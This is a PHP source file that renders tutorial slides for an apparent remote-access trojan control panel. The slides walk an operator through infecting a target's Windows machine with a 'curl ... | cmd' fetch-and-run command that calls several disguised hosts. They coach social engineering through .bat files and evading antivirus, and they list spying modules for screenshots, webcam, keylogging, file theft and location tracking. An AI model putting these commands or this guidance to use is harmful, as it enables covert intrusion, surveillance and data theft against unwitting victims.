<?php

namespace Kelvinho\Virus\Singleton;

use Kelvinho\Virus\Network\Session;
use function Kelvinho\Virus\map;
use function Kelvinho\Virus\set;

class Demos {
    private Session $session;
    private int $id = 0;
    private static string $SMALL = "imgSmall";
    private static string $MEDIUM = "imgMedium";
    private static string $LARGE = "imgLarge";

    public function __construct(Session $session) {
        $this->session = $session;
    }

    private function imgAndText(string $slideId, string $imgUrl, string $text, string $imgSize) { ?>
        <div class="demoContent" id="demoContent<?php echo $this->id; ?>-<?php echo $slideId ?>">
            <div style="width: 100%; text-align: center">
                <img src="<?php echo $imgUrl; ?>" alt="" class="<?php echo $imgSize; ?>">
            </div>
            <div style="padding: 20px;" class="p"><?php echo $text; ?></div>
        </div>
    <?php }

    private function text(string $slideId, string $text) { ?>
        <div class="demoContent p" id="demoContent<?php echo $this->id; ?>-<?php echo $slideId ?>"
             style="padding: 20px">
            <?php echo $text; ?>
        </div>
    <?php }

    /**
     * Displays the demo, with interactive buttons and everything.
     *
     * @param string[] $slides List of slide identifiers
     */
    public function render(array $slides): void { ?>
        <div id="demo" class="w3-card" style="width: 100%; position: relative">
            <div class="demoNav" style="left: 95%" onclick="demos[<?php echo $this->id; ?>].next()"></div>
            <div class="demoNav" style="left: 0" onclick="demos[<?php echo $this->id; ?>].prev()"></div>
            <i class="material-icons p"
               style="position: absolute; top: 50%; left: 2.5%; transform: translate(-50%, -50%); pointer-events: none">navigate_before</i>
            <i class="material-icons p"
               style="position: absolute; top: 50%; left: 97.5%; transform: translate(-50%, -50%); pointer-events: none">navigate_next</i>
            <div style="float: left; width: 5%; height: 1px; opacity: 0"></div>
            <?php
            $user_handle = $this->session->get("user_handle");
            $sSlides = set($slides);
            // if statements so that not a lot of text and images will have to load
            if (isset($sSlides["dash-0"])) $this->imgAndText("dash-0", DOMAIN . "/resources/images/dash-0.jpg", "First, open up the \"Run\" window on the computer you want to infect ( <span style='box-shadow: 0 0 3px 0 #000; border-radius: 3px; padding: 1px 2px 2px 2px'>⊞ Win</span> + <span style='box-shadow: 0 0 3px 0 #000; border-radius: 3px; padding: 1px 2px 2px 2px'>R</span> ), type in \"cmd\", and press enter to open the Command Prompt.", self::$SMALL);
            if (isset($sSlides["dash-1"])) $this->imgAndText("dash-1", DOMAIN . "/resources/images/dash-1.jpg", "Then execute this command like the above:<div style='overflow: auto'><pre class='codes' style='white-space: pre'>curl a.virs.app/new/$user_handle | cmd</pre></div>
                The \"|\" character, known as the vertical bar, normally sits <a href='/resources/images/normal_vertical_bar.png' target=_blank class='link'>right above the enter button</a>. Some keyboards denote it with <a href='/resources/images/split_vertical_bar.jpg' target=_blank class='link'>2 vertical bars align end-to-end</a>.", self::$MEDIUM);
            if (isset($sSlides["dash-2"])) $this->text("dash-2", "You can also use any of the following commands, if you need to social engineer your target:<div style='overflow: auto'>" .
                implode(map(["cdn.simulationdemos.com", "graph.simulationdemos.com", "cdn.notescapture.com", "cdn.engr113.com", "cloud.engr113.com", "sr71.engr113.com"], fn($alt) => "<pre class='codes' style='white-space: pre'>curl $alt/new/$user_handle | cmd</pre>")) . "</div>
                <b><i>For technical users</i></b>, you can also put any of these command to a <code>.cmd</code> or a <code>.bat</code> file, send it to your target and persuade them to execute it. You can also host your own domain, and redirect it to any of the above domains. Then, the command to install will now be:<div style='overflow: auto'><pre class='codes' style='white-space: pre'>curl -L awesome.app.com/new/$user_handle | cmd</pre></div>");
            if (isset($sSlides["dash-3"])) $this->imgAndText("dash-3", DOMAIN . "/resources/images/dash-3.jpg", "Instantaneously after you have run that command, you should be able to see that virus pops up in the list of expecting viruses. After a few seconds, the virus will ping back for the first time, and will jump to the active viruses category. If this doesn't happen, then it could be that an antivirus has hunted it down. Most antivirus on personal computers won't hunt this down, but all bets are off if you are attacking a secure, high-profile location.<br><br>From now on, you should be able to use this virus as usual.", self::$LARGE);
            if (isset($sSlides["advice-0"])) $this->text("advice-0", "<h2>Advice</h2><p>I recommend you memorize the installation command because when you are actually attacking them, you need to do it quickly, before they can notice anything. I also recommend installing 1 initial virus on a target machine, then install a new one <b>using the existing one</b> that acts as a backup.</p><p>Test everything locally first, on either your machine or a VM, then actually getting out to attack. The chances for attacking is very small, and you wouldn't want to have a chance and it doesn't get installed properly do you?</p>");
            if (isset($sSlides["virus-0"])) $this->text("virus-0", "<h2>Attack types</h2>
                <p><b>One time</b>: These are attacks that run once, report back, and you can view the results. Pretty straightforward.</p>
                <p><b>Session</b>: These are attacks that run for a short period of time (~5 to 30 minutes), giving you results in realtime, and once that period of time is over, you can view every past results. These can be things like, monitor their screen every 5 seconds and streaming back.</p>
                <p><b>Background</b>: These are attacks that can run indefinitely if you choose to. Old data past 2 days will be deleted, new data will keep streaming in and you can decide what data to keep. These can be things like monitoring when they plugged in a USB, monitoring their screen 24/7, or seeing what programs they are running.</p>");
            if (isset($sSlides["virus-1"])) $this->imgAndText("virus-1", DOMAIN . "/resources/images/virus-1.jpg", "To initiate an attack, first choose a package, each of which will tell the virus to do different things. In this example, it's <b>easy.CollectEnv</b>. Then click continue.", self::$MEDIUM);
            if (isset($sSlides["virus-2"])) $this->imgAndText("virus-2", DOMAIN . "/resources/images/virus-2.jpg", "Then you can deploy it and the virus will start to execute it. Typically, one time attacks take 10 seconds to execute. If the target computer is not online, then the virus can't execute any attacks. In the meantime, you can cancel attacking if you choose to.", self::$MEDIUM);
            if (isset($sSlides["virus-3"])) $this->imgAndText("virus-3", DOMAIN . "/resources/images/virus-3.jpg", "This is a sample result for <b>easy.CollectEnv</b>. On the menu, you can go to the previous, next attack or delete the attack altogether.", self::$SMALL);
            if (isset($sSlides["virus-4"])) $this->imgAndText("virus-4", DOMAIN . "/resources/images/virus-4.jpg", "In the case of background attacks, like the package <b>easy.background.MonitorScreen</b> shown above, there are 2 windows, '<b>Daily</b>' and '<b>Saved</b>'. 'Daily' window contains attacks that gets automatically triggered every period of time (usually 1 hour). If you don't do anything to those attacks, they will be automatically deleted after 2 days so it won't clutter. There is a mechanism to save specific, interesting attacks and those show up in the 'Saved' window.", self::$MEDIUM);
            if (isset($sSlides["virus-5"])) $this->imgAndText("virus-5", DOMAIN . "/resources/images/virus-5.jpg", "Click on either the Daily or Saved menu buttons to see a list of attacks and choose whatever you like. If you want to save an attack, simply click Save, same goes for Forget.", self::$MEDIUM);
            if (isset($sSlides["advice-1"])) $this->text("advice-1", "<h2>Advice</h2><p>The virus will be living in a very hostile environment. Antiviruses nowadays are quite smart, and if you make too much noise, they will start to notice you. So it's best not to run session attacks more than 10 times a day. Also, the virus itself doesn't have a lot of computing resources, so don't expect absolutely real time monitoring. Instead, you should expect a few seconds delay.</p>");
            if (isset($sSlides["virus-6"])) $this->text("virus-6", "<h2>Starting up</h2><p>When the virus is newly installed, you will want to test out if the virus gets installed properly. These packages are simple, you don't need to configure anything, can't go wrong, and mostly just gather system information:</p>
                <ul><li>easy.CollectEnv</li><li>easy.ScanPartitions</li><li>easy.SystemInfo</li><li>easy.ProductKey</li></ul>");
            if (isset($sSlides["virus-7"])) $this->text("virus-7", "<h2>Getting into the action</h2>
                <p>Common packages after exploring initially include <b>easy.ExploreDir</b>, to explore the file tree starting from any folder. Then you can view any files using <b>easy.CollectFile</b>. Then there's <b>easy.Screenshot</b> and <b>easy.Webcam</b>. Both of them are quite dangerous to activate, as they are quite complex, and therefore likely to be caught by an antivirus. However, after you have executed this for the first time, then every attack later on will be perfectly fine. In case you are wondering, deploying <b>easy.Webcam</b> will turn the webcam light on, so do this at your own risk. There are ways to turn on the webcam without turning on the light, but that depends a whole lot on the actual infected computer and is very difficult to get right.</p>
                <p>Less common packages include <b>easy.NewVirus</b>, which will let you install multiple viruses at different locations. I suggest you name the location so that it sounds legitimate, like 'ECommerce', 'Kaspersky, 'Gmail', and so on. There is also <b>easy.Power</b>, which can shutdown or restart the computer and <b>easy.SelfDestruct</b> which will annihilate the virus completely, leaving no traces behind. Be warned that there is no way to recover this.</p>
                <p>Finally, you can then setup background attacks <b>easy.background.MonitorLocation</b> and <b>easy.background.MonitorScreen</b>. Monitoring location is done using the ISP's location, and not GPS, so the accuracy will not be high, sometimes as far away as 3km from ground truth. If they use a VPN provider, then this will be incorrect. Also, <b>easy.background.MonitorScreen</b> actually requires you to execute <b>easy.Screenshot</b> at least once beforehand, so that the binary is there.</p>");
            if (isset($sSlides["virus-8"])) $this->text("virus-8", "<h2>For advanced users</h2><p>If you are an advanced user, then you can use <b>adv.CheckPermission</b> to check write permission of any folder or file. Using that, you can then use <b>adv.ExecuteScript</b> to execute arbitrary batch scripts. There is a simple raw text hosting capability built in, for any extra code you want to download and use, and there are also <b>%~pd0data</b> and <b>%~pd0err</b> files that you can pipe to for some feedback. Before diving into this, I highly suggest going to the <a href='" . GITHUB_PAGE . "' class='link'>source code</a> of this project, understand how the virus actually works before writing any scripts that alter its behavior. Lastly, <b>easy.background.MonitorKeyboard</b> will record every keystroke and report back. This package is not very complicated compared to other background attacks, but is buggy and unreliable for now.</p>");
            ?>
            <div id="demoProgress<?php echo $this->id; ?>"
                 style="position: absolute; width: 0; height: 3px; bottom: 0; background-color: green; transition: width var(--smooth)"></div>
            <div style="clear: both"></div>
        </div>
        <script>
            <?php if ($this->id === 0) { ?>const demos = [];<?php } ?>
            demos.push(new Demo(<?php echo $this->id; ?>, <?php echo json_encode($slides); ?>));
        </script>
        <?php
        $this->id++;
    }

    public function renderDashboard(): void {
        $this->render(["dash-0", "dash-1", "dash-2", "dash-3", "advice-0"]);
    }

    public function renderVirusHowTo(): void {
        $this->render(["virus-0", "virus-1", "virus-2", "virus-3", "virus-4", "virus-5", "advice-1"]);
    }

    public function renderVirusWhich(): void {
        $this->render(["virus-6", "virus-7", "virus-8"]);
    }

    public function renderReference(): void {
    }
}
